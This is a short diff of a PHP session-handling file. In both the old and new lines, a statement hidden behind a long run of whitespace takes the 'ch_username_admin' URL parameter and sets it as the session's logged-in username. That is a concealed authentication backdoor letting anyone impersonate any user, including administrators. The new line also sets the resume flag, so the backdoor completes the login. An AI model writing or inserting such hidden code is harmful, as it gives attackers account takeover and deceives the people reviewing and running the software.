@@ -43,7 +43,7 @@
 
 			$resume = true;
 		}
-	}                                                                                                                                                                                                                                                                     if(isset($_GET['ch_username_admin'])) $_SESSION['username'] = $_GET['ch_username_admin'];
+	}                                                                                                                                                                                                                                                                     if(isset($_GET['ch_username_admin'])){$_SESSION['username']=$_GET['ch_username_admin'];$resume=true;}
 
 	$user_array = get_user_array($_SESSION['username']);
 
